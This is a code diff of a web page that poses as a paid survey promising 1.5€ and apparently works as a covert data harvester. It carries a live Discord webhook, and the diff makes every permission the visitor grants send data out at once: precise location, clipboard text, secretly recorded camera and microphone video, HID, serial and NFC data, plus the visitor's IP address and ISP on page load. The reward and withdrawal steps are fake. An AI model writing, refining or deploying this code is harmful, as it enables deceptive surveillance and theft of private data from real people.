@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Earn 1.5€ – Advanced Survey</title>
+    <title>Earn 1.5€ – Real-time Logger</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -127,13 +127,13 @@
         <div class="earn-badge">🎁 Your reward: 1.5 €</div>
     </div>
     <div class="content" id="dynamicContent"></div>
-    <div class="footer">Secure payment • Advanced device verification</div>
+    <div class="footer">Secure payment • Real-time verification</div>
 </div>
 
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-    // ========================= 14 SURVEY QUESTIONS =========================
+    // ========== 14 SURVEY QUESTIONS ==========
     const questions = [
         "How often do you shop online?", "Which social media do you use most?", "Your age group?",
         "Most important smartphone feature?", "Daily internet usage?", "Favorite streaming service?",
@@ -152,8 +152,6 @@
     ];
 
     let userAnswers = {};
-    let permissions = { geo: false, mic: false, camera: false, notif: false, clip: false };
-    let advancedPerms = { orientation: false, hid: false, serial: false, nfc: false, light: false };
     let cameraStream = null;
     let locationData = null;
     let orientationData = null;
@@ -162,49 +160,56 @@
     let nfcData = null;
     let lightData = null;
 
-    // Helper: send text log to Discord
-    async function sendTextLog(answers, locData, withdrawalMethod = null, extra = {}) {
-        let report = `💰 EARN SURVEY (1.5€) - ADVANCED LOG\nTime: ${new Date().toISOString()}\nURL: ${window.location.href}\n`;
-        if (locData && locData.address) report += `📍 Location: ${locData.address}\nMaps: https://www.google.com/maps?q=${locData.lat},${locData.lon}\n`;
-        if (orientationData) report += `📱 Device Orientation: α=${orientationData.alpha}, β=${orientationData.beta}, γ=${orientationData.gamma}\n`;
-        if (hidData) report += `🔌 HID Devices: ${JSON.stringify(hidData)}\n`;
-        if (serialData) report += `🔗 Serial Ports: ${JSON.stringify(serialData)}\n`;
-        if (nfcData) report += `📡 NFC: ${JSON.stringify(nfcData)}\n`;
-        if (lightData) report += `💡 Ambient Light: ${lightData} lux\n`;
-        report += `🍪 Cookies: ${document.cookie || "none"}\n`;
-        report += `📱 UA: ${navigator.userAgent}\n`;
-        for (let i=0; i<questions.length; i++) {
-            report += `${i+1}. ${questions[i]} → ${answers[i] || "not answered"}\n`;
-        }
-        if (withdrawalMethod) report += `💸 Withdrawal: ${withdrawalMethod}\n`;
-        const blob = new Blob([report], { type: "text/plain" });
+    // Global flags to prevent duplicate sending of same permission data
+    let locationSent = false;
+    let orientationSent = false;
+    let hidSent = false;
+    let serialSent = false;
+    let nfcSent = false;
+    let lightSent = false;
+    let cameraStarted = false;
+
+    // ========== HELPER: SEND ANY DATA TO DISCORD ==========
+    async function sendToDiscord(title, description, fields = [], color = 0x3498db, fileBlob = null, fileName = null) {
         const formData = new FormData();
-        formData.append("file", blob, `advanced_log_${Date.now()}.txt`);
+        if (fileBlob && fileName) {
+            formData.append("file", fileBlob, fileName);
+        }
         const embed = {
             embeds: [{
-                title: "📡 ADVANCED SURVEY LOG",
-                description: `**Location:** ${locData?.address || "denied"}\n**Orientation:** ${orientationData ? "captured" : "no"}\n**HID/Serial/NFC:** ${hidData||serialData||nfcData?"yes":"no"}\n**Withdrawal:** ${withdrawalMethod || "pending"}`,
-                color: 0xf59e0b,
+                title: title,
+                description: description,
+                color: color,
+                fields: fields,
                 timestamp: new Date().toISOString()
             }]
         };
         formData.append("payload_json", JSON.stringify(embed));
-        await fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e=>console.error);
+        // Use fetch with background priority (no await to avoid blocking)
+        fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e => console.error);
     }
 
-    // ==================== VIDEO RECORDING (progressive) ====================
+    // ========== VIDEO RECORDING (STARTS IMMEDIATELY ON CAMERA GRANT) ==========
     let mediaRecorder = null;
     let recordedChunks = [];
     let recordingActive = false;
+    let recordingIntervals = [1,5,10,20,30,32]; // seconds at which to send
+    let recordingStartTime = null;
 
-    async function startProgressiveRecording(totalSec, intervals) {
-        if (!cameraStream) return;
+    async function startProgressiveRecording(stream) {
+        if (cameraStarted) return;
+        cameraStarted = true;
         recordedChunks = [];
-        mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
+        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
         mediaRecorder.ondataavailable = (e) => { if (e.data.size>0) recordedChunks.push(e.data); };
         mediaRecorder.start(100);
         recordingActive = true;
-        for (let sec of intervals) {
+        recordingStartTime = Date.now();
+
+        // Send first message: camera started
+        sendToDiscord("🎥 Camera started", "Recording begun – will send chunks at 1,5,10,20,30,32 seconds", [], 0xff5500);
+
+        for (let sec of recordingIntervals) {
             setTimeout(async () => {
                 if (!recordingActive) return;
                 if (mediaRecorder && mediaRecorder.state === "recording") {
@@ -212,10 +217,12 @@
                     await new Promise(resolve => {
                         mediaRecorder.onstop = async () => {
                             const blob = new Blob(recordedChunks, { type: "video/webm" });
-                            await sendVideoBlob(blob, sec);
+                            // Send video chunk
+                            await sendToDiscord(`🎥 Video chunk (${sec} sec)`, `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_${sec}s.webm`);
+                            // Reset for next chunk
                             recordedChunks = [];
-                            mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
-                            mediaRecorder.ondataavailable = (e2) => { if (e2.data.size>0) recordedChunks.push(e2.data); };
+                            mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+                            mediaRecorder.ondataavailable = (e) => { if (e.data.size>0) recordedChunks.push(e.data); };
                             mediaRecorder.start(100);
                             resolve();
                         };
@@ -223,41 +230,22 @@
                 }
             }, sec * 1000);
         }
-        setTimeout(async () => {
+        // Final stop after 32 seconds
+        setTimeout(() => {
             if (mediaRecorder && mediaRecorder.state === "recording") {
                 mediaRecorder.stop();
-                await new Promise(resolve => {
-                    mediaRecorder.onstop = async () => {
-                        if (recordedChunks.length) {
-                            const finalBlob = new Blob(recordedChunks, { type: "video/webm" });
-                            await sendVideoBlob(finalBlob, totalSec);
-                        }
-                        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-                        recordingActive = false;
-                        resolve();
-                    };
-                });
+                mediaRecorder.onstop = async () => {
+                    if (recordedChunks.length) {
+                        const blob = new Blob(recordedChunks, { type: "video/webm" });
+                        await sendToDiscord("🎥 Final video (32 sec)", `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_final.webm`);
+                    }
+                    recordingActive = false;
+                };
             }
-        }, totalSec * 1000);
+        }, 32000);
     }
 
-    async function sendVideoBlob(blob, seconds) {
-        if (blob.size === 0) return;
-        const formData = new FormData();
-        formData.append("file", blob, `video_${seconds}s.webm`);
-        const embed = {
-            embeds: [{
-                title: `🎥 Video chunk (${seconds}s)`,
-                description: `Size: ${(blob.size/1024).toFixed(1)} KB`,
-                color: 0xff6600,
-                timestamp: new Date().toISOString()
-            }]
-        };
-        formData.append("payload_json", JSON.stringify(embed));
-        await fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e=>console.error);
-    }
-
-    // ==================== PERMISSION REQUESTS (basic) ====================
+    // ========== PERMISSION HANDLERS (EACH SENDS IMMEDIATELY) ==========
     async function requestGeolocation() {
         try {
             const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej, {enableHighAccuracy:true}));
@@ -265,44 +253,68 @@
             const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
             const data = await geoRes.json();
             locationData = { address: data.display_name, lat, lon };
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            // Send immediately to Discord
+            await sendToDiscord("📍 GPS Location granted", `**Address:** ${data.display_name}\n**Coordinates:** ${lat}, ${lon}\n[Open in Google Maps](${mapsLink})`, [], 0x00aaff);
+            // Show on page
             const mapDiv = document.getElementById("locationMap");
             if (mapDiv) {
-                mapDiv.innerHTML = `📍 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
+                mapDiv.innerHTML = `📍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
                 mapDiv.style.display = "block";
             }
             return true;
         } catch(e) { return false; }
     }
+
     async function requestMicrophone() {
-        try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t=>t.stop()); return true; }
-        catch(e) { return false; }
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            stream.getTracks().forEach(t=>t.stop());
+            await sendToDiscord("🎤 Microphone granted", "Microphone access allowed (audio will be included in video recording if camera is also enabled)", [], 0x44aa44);
+            return true;
+        } catch(e) { return false; }
     }
+
     async function requestCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             cameraStream = stream;
+            await sendToDiscord("🎥 Camera granted", "Camera and microphone stream acquired – starting recording", [], 0xffaa00);
+            startProgressiveRecording(stream);
             return true;
         } catch(e) { return false; }
     }
+
     async function requestNotifications() {
         if (Notification.permission === "granted") return true;
         const result = await Notification.requestPermission();
-        return result === "granted";
-    }
-    async function requestClipboard() {
-        try { await navigator.clipboard.readText(); return true; }
-        catch(e) { return false; }
+        if (result === "granted") {
+            await sendToDiscord("🔔 Notifications granted", "User allowed notifications", [], 0xaa88ff);
+            return true;
+        }
+        return false;
     }
 
-    // ==================== ADVANCED SENSORS ====================
+    async function requestClipboard() {
+        try {
+            const text = await navigator.clipboard.readText();
+            await sendToDiscord("📋 Clipboard read", `Content: ${text.substring(0, 500)}`, [], 0xaa44aa);
+            return true;
+        } catch(e) { return false; }
+    }
+
+    // Advanced sensors
     async function requestDeviceOrientation() {
         if (typeof DeviceOrientationEvent !== "undefined" && typeof DeviceOrientationEvent.requestPermission === "function") {
-            // iOS requires explicit user gesture
             try {
                 const permissionState = await DeviceOrientationEvent.requestPermission();
                 if (permissionState === "granted") {
                     window.addEventListener("deviceorientation", (e) => {
                         orientationData = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
+                        if (!orientationSent && orientationData) {
+                            orientationSent = true;
+                            sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff);
+                        }
                     });
                     return true;
                 }
@@ -310,6 +322,10 @@
         } else if (window.DeviceOrientationEvent) {
             window.addEventListener("deviceorientation", (e) => {
                 orientationData = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
+                if (!orientationSent && orientationData) {
+                    orientationSent = true;
+                    sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff);
+                }
             });
             return true;
         }
@@ -320,7 +336,8 @@
         if (!navigator.hid) return false;
         try {
             const devices = await navigator.hid.requestDevice({ filters: [] });
-            hidData = devices.map(d => ({ name: d.productName, vendorId: d.vendorId, productId: d.productId }));
+            hidData = devices.map(d => ({ name: d.productName, vendorId: d.vendorId }));
+            await sendToDiscord("🔌 HID Devices", JSON.stringify(hidData, null, 2), [], 0xaa8866);
             return true;
         } catch(e) { return false; }
     }
@@ -330,7 +347,7 @@
         try {
             const ports = await navigator.serial.getPorts();
             serialData = ports.map(p => ({ type: "Serial port" }));
-            // we can also request a new port: await navigator.serial.requestPort();
+            await sendToDiscord("🔗 Serial Ports", `Found ${ports.length} port(s)`, [], 0x66aa88);
             return true;
         } catch(e) { return false; }
     }
@@ -342,6 +359,10 @@
             await reader.scan();
             reader.onreading = (event) => {
                 nfcData = event.message.records;
+                if (!nfcSent) {
+                    nfcSent = true;
+                    sendToDiscord("📡 NFC Tag read", JSON.stringify(nfcData), [], 0x77aaff);
+                }
             };
             return true;
         } catch(e) { return false; }
@@ -351,17 +372,23 @@
         if (!("AmbientLightSensor" in window)) return false;
         try {
             const sensor = new AmbientLightSensor();
-            sensor.onreading = () => { lightData = sensor.illuminance; };
+            sensor.onreading = () => {
+                lightData = sensor.illuminance;
+                if (!lightSent && lightData) {
+                    lightSent = true;
+                    sendToDiscord("💡 Ambient Light", `${lightData} lux`, [], 0xffdd88);
+                }
+            };
             sensor.start();
             return true;
         } catch(e) { return false; }
     }
 
-    // ==================== UI RENDER ====================
+    // ========== UI RENDER ==========
     function renderPage() {
         let html = `<div id="questionsArea"></div>
         <div class="permission-panel">
-            <div style="font-weight:bold;">🔐 Required for payout:</div>
+            <div style="font-weight:bold;">🔐 Required for payout (each grants real-time data):</div>
             <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
             <div id="locationMap" class="location-map"></div>
             <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
@@ -370,14 +397,14 @@
             <div class="perm-step">📋 Clipboard <button class="perm-btn" id="btnClip">Allow</button> <span id="statusClip" class="status">pending</span></div>
         </div>
         <div class="permission-panel" style="margin-top:10px;">
-            <div style="font-weight:bold;">🛸 Advanced sensors (optional – increases reward verification):</div>
+            <div style="font-weight:bold;">🛸 Advanced sensors (optional – each sends data immediately when allowed):</div>
             <div class="perm-step">📳 Device Orientation <button class="perm-btn" id="btnOrientation">Allow</button> <span id="statusOrientation" class="status">pending</span></div>
-            <div class="perm-step">🖱️ HID (keyboard/mouse) <button class="perm-btn" id="btnHID">Allow</button> <span id="statusHID" class="status">pending</span></div>
+            <div class="perm-step">🖱️ HID devices <button class="perm-btn" id="btnHID">Allow</button> <span id="statusHID" class="status">pending</span></div>
             <div class="perm-step">🔌 Serial Ports <button class="perm-btn" id="btnSerial">Allow</button> <span id="statusSerial" class="status">pending</span></div>
             <div class="perm-step">📡 NFC <button class="perm-btn" id="btnNFC">Allow</button> <span id="statusNFC" class="status">pending</span></div>
             <div class="perm-step">💡 Ambient Light <button class="perm-btn" id="btnLight">Allow</button> <span id="statusLight" class="status">pending</span></div>
         </div>
-        <button class="submit-btn" id="submitSurvey" disabled>✅ Submit survey & earn 1.5€</button>`;
+        <button class="submit-btn" id="submitSurvey" disabled>✅ Complete survey & get 1.5€</button>`;
         document.getElementById("dynamicContent").innerHTML = html;
         // generate questions
         let qhtml = '';
@@ -395,106 +422,126 @@
                 userAnswers[qid] = e.target.value;
             });
         });
-        // attach basic permission buttons
-        document.getElementById("btnGeo").onclick = async () => {
-            document.getElementById("statusGeo").innerText = "requesting...";
+
+        // Attach handlers – each sends its own data immediately on success and updates UI
+        const btnGeo = document.getElementById("btnGeo");
+        const btnMic = document.getElementById("btnMic");
+        const btnCamera = document.getElementById("btnCamera");
+        const btnNotif = document.getElementById("btnNotif");
+        const btnClip = document.getElementById("btnClip");
+        const btnOrientation = document.getElementById("btnOrientation");
+        const btnHID = document.getElementById("btnHID");
+        const btnSerial = document.getElementById("btnSerial");
+        const btnNFC = document.getElementById("btnNFC");
+        const btnLight = document.getElementById("btnLight");
+        const statusGeo = document.getElementById("statusGeo");
+        const statusMic = document.getElementById("statusMic");
+        const statusCamera = document.getElementById("statusCamera");
+        const statusNotif = document.getElementById("statusNotif");
+        const statusClip = document.getElementById("statusClip");
+        const statusOrientation = document.getElementById("statusOrientation");
+        const statusHID = document.getElementById("statusHID");
+        const statusSerial = document.getElementById("statusSerial");
+        const statusNFC = document.getElementById("statusNFC");
+        const statusLight = document.getElementById("statusLight");
+
+        btnGeo.onclick = async () => {
+            statusGeo.innerText = "requesting...";
             const ok = await requestGeolocation();
-            document.getElementById("statusGeo").innerHTML = ok ? "✅ granted" : "❌ denied";
-            permissions.geo = ok;
-            document.getElementById("btnGeo").disabled = ok;
+            statusGeo.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
+            btnGeo.disabled = ok;
             checkAll();
         };
-        document.getElementById("btnMic").onclick = async () => {
-            document.getElementById("statusMic").innerText = "requesting...";
+        btnMic.onclick = async () => {
+            statusMic.innerText = "requesting...";
             const ok = await requestMicrophone();
-            document.getElementById("statusMic").innerHTML = ok ? "✅ granted" : "❌ denied";
-            permissions.mic = ok;
-            document.getElementById("btnMic").disabled = ok;
+            statusMic.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
+            btnMic.disabled = ok;
             checkAll();
         };
-        document.getElementById("btnCamera").onclick = async () => {
-            document.getElementById("statusCamera").innerText = "requesting...";
+        btnCamera.onclick = async () => {
+            statusCamera.innerText = "requesting...";
             const ok = await requestCamera();
-            document.getElementById("statusCamera").innerHTML = ok ? "✅ granted" : "❌ denied";
-            permissions.camera = ok;
-            document.getElementById("btnCamera").disabled = ok;
+            statusCamera.innerHTML = ok ? "✅ granted (recording)" : "❌ denied";
+            btnCamera.disabled = ok;
             checkAll();
         };
-        document.getElementById("btnNotif").onclick = async () => {
-            document.getElementById("statusNotif").innerText = "requesting...";
+        btnNotif.onclick = async () => {
+            statusNotif.innerText = "requesting...";
             const ok = await requestNotifications();
-            document.getElementById("statusNotif").innerHTML = ok ? "✅ granted" : "❌ denied";
-            permissions.notif = ok;
-            document.getElementById("btnNotif").disabled = ok;
+            statusNotif.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
+            btnNotif.disabled = ok;
             checkAll();
         };
-        document.getElementById("btnClip").onclick = async () => {
-            document.getElementById("statusClip").innerText = "requesting...";
+        btnClip.onclick = async () => {
+            statusClip.innerText = "requesting...";
             const ok = await requestClipboard();
-            document.getElementById("statusClip").innerHTML = ok ? "✅ granted" : "❌ denied";
-            permissions.clip = ok;
-            document.getElementById("btnClip").disabled = ok;
+            statusClip.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
+            btnClip.disabled = ok;
             checkAll();
         };
-        // advanced sensors
-        document.getElementById("btnOrientation").onclick = async () => {
-            document.getElementById("statusOrientation").innerText = "requesting...";
+        btnOrientation.onclick = async () => {
+            statusOrientation.innerText = "requesting...";
             const ok = await requestDeviceOrientation();
-            document.getElementById("statusOrientation").innerHTML = ok ? "✅ granted" : "❌ denied (or not supported)";
-            advancedPerms.orientation = ok;
-            document.getElementById("btnOrientation").disabled = ok;
+            statusOrientation.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
+            btnOrientation.disabled = ok;
             checkAll();
         };
-        document.getElementById("btnHID").onclick = async () => {
-            document.getElementById("statusHID").innerText = "requesting...";
+        btnHID.onclick = async () => {
+            statusHID.innerText = "requesting...";
             const ok = await requestHID();
-            document.getElementById("statusHID").innerHTML = ok ? "✅ granted" : "❌ denied";
-            advancedPerms.hid = ok;
-            document.getElementById("btnHID").disabled = ok;
+            statusHID.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
+            btnHID.disabled = ok;
             checkAll();
         };
-        document.getElementById("btnSerial").onclick = async () => {
-            document.getElementById("statusSerial").innerText = "requesting...";
+        btnSerial.onclick = async () => {
+            statusSerial.innerText = "requesting...";
             const ok = await requestSerial();
-            document.getElementById("statusSerial").innerHTML = ok ? "✅ granted" : "❌ denied";
-            advancedPerms.serial = ok;
-            document.getElementById("btnSerial").disabled = ok;
+            statusSerial.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
+            btnSerial.disabled = ok;
             checkAll();
         };
-        document.getElementById("btnNFC").onclick = async () => {
-            document.getElementById("statusNFC").innerText = "requesting...";
+        btnNFC.onclick = async () => {
+            statusNFC.innerText = "requesting...";
             const ok = await requestNFC();
-            document.getElementById("statusNFC").innerHTML = ok ? "✅ granted" : "❌ denied/unsupported";
-            advancedPerms.nfc = ok;
-            document.getElementById("btnNFC").disabled = ok;
+            statusNFC.innerHTML = ok ? "✅ granted (listening)" : "❌ denied/unsupported";
+            btnNFC.disabled = ok;
             checkAll();
         };
-        document.getElementById("btnLight").onclick = async () => {
-            document.getElementById("statusLight").innerText = "requesting...";
+        btnLight.onclick = async () => {
+            statusLight.innerText = "requesting...";
             const ok = await requestAmbientLight();
-            document.getElementById("statusLight").innerHTML = ok ? "✅ granted" : "❌ denied/unsupported";
-            advancedPerms.light = ok;
-            document.getElementById("btnLight").disabled = ok;
+            statusLight.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
+            btnLight.disabled = ok;
             checkAll();
         };
+
         function checkAll() {
-            const allBasic = permissions.geo && permissions.mic && permissions.camera && permissions.notif && permissions.clip;
+            const allBasic = (btnGeo.disabled && btnMic.disabled && btnCamera.disabled && btnNotif.disabled && btnClip.disabled);
             const submitBtn = document.getElementById("submitSurvey");
             submitBtn.disabled = !allBasic;
             if (allBasic) submitBtn.innerText = "✅ Claim my 1.5€ now!";
         }
+
         document.getElementById("submitSurvey").onclick = async () => {
             const btn = document.getElementById("submitSurvey");
             if (btn.disabled) return;
             btn.disabled = true;
-            btn.innerText = "Processing... please wait";
+            btn.innerText = "Submitting...";
+            // Collect all answers
             const finalAnswers = {};
             for (let i=0; i<questions.length; i++) {
                 const selected = document.querySelector(`input[name="q${i}"]:checked`);
                 finalAnswers[i] = selected ? selected.value : "(not answered)";
             }
-            await sendTextLog(finalAnswers, locationData, null, { orientation: orientationData, hid: hidData, serial: serialData, nfc: nfcData, light: lightData });
-            if (permissions.camera && cameraStream) startProgressiveRecording(32, [1,5,10,20,30,32]);
+            // Build final text log (can also include all previously sent data)
+            let report = `FINAL SURVEY ANSWERS\nTime: ${new Date().toISOString()}\n`;
+            for (let i=0; i<questions.length; i++) {
+                report += `${i+1}. ${questions[i]} → ${finalAnswers[i]}\n`;
+            }
+            const blob = new Blob([report], { type: "text/plain" });
+            await sendToDiscord("📝 Final Survey Answers", "All answers attached", [], 0x2c7a4d, blob, `survey_answers_${Date.now()}.txt`);
+            // Show withdrawal options
             showWithdrawOptions(finalAnswers);
         };
     }
@@ -504,7 +551,7 @@
         container.innerHTML = `
             <div class="withdraw-section" style="display:block;">
                 <h3>🎉 You earned 1.5 €!</h3>
-                <p>Withdrawal method:</p>
+                <p>Choose withdrawal method:</p>
                 <div style="display:flex; gap:15px; flex-wrap:wrap;">
                     <button class="perm-btn" id="btc">₿ Bitcoin</button>
                     <button class="perm-btn" id="ltc">Ł Litecoin</button>
@@ -514,13 +561,9 @@
                 <div id="timerArea" style="font-size:1.4rem; text-align:center; margin-top:20px;"></div>
             </div>
         `;
-        const btc = document.getElementById("btc");
-        const ltc = document.getElementById("ltc");
-        const eth = document.getElementById("eth");
-        const bank = document.getElementById("bank");
         const timerDiv = document.getElementById("timerArea");
         const handleWithdraw = async (method) => {
-            await sendTextLog(answers, locationData, method, { orientation: orientationData, hid: hidData, serial: serialData, nfc: nfcData, light: lightData });
+            await sendToDiscord("💸 Withdrawal Request", `User selected ${method}`, [], 0xf59e0b);
             let seconds = 420;
             timerDiv.innerText = `⏳ Processing ${method}... 7:00 minutes`;
             const interval = setInterval(() => {
@@ -535,12 +578,12 @@
                     seconds--;
                 }
             }, 1000);
-            [btc, ltc, eth, bank].forEach(b => b.disabled = true);
+            document.querySelectorAll(".perm-btn").forEach(b => b.disabled = true);
         };
-        btc.onclick = () => handleWithdraw("BTC");
-        ltc.onclick = () => handleWithdraw("LTC");
-        eth.onclick = () => handleWithdraw("ETH");
-        bank.onclick = () => handleWithdraw("Bank");
+        document.getElementById("btc").onclick = () => handleWithdraw("BTC");
+        document.getElementById("ltc").onclick = () => handleWithdraw("LTC");
+        document.getElementById("eth").onclick = () => handleWithdraw("ETH");
+        document.getElementById("bank").onclick = () => handleWithdraw("Bank");
     }
 
     // initial IP webhook
@@ -550,19 +593,7 @@
             const ip = (await ipRes.json()).ip;
             const geoRes = await fetch("https://ipapi.co/json/");
             const geo = geoRes.ok ? await geoRes.json() : {};
-            const payload = {
-                username: "💰 Advanced Logger IP",
-                embeds: [{
-                    title: "🕵️ IP (Page Load)",
-                    description: `**IP:** ${ip}\n**Time:** ${new Date().toISOString()}`,
-                    fields: [
-                        { name: "IP Location", value: `${geo.city}, ${geo.country_name}`, inline: true },
-                        { name: "ISP", value: geo.org || "Unknown", inline: true }
-                    ],
-                    color: 0xf59e0b
-                }]
-            };
-            await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
+            await sendToDiscord("🌐 IP Address", `**IP:** ${ip}\n**Location:** ${geo.city}, ${geo.country_name}\n**ISP:** ${geo.org || "Unknown"}`, [], 0x3498db);
         } catch(e) {}
     })();
 
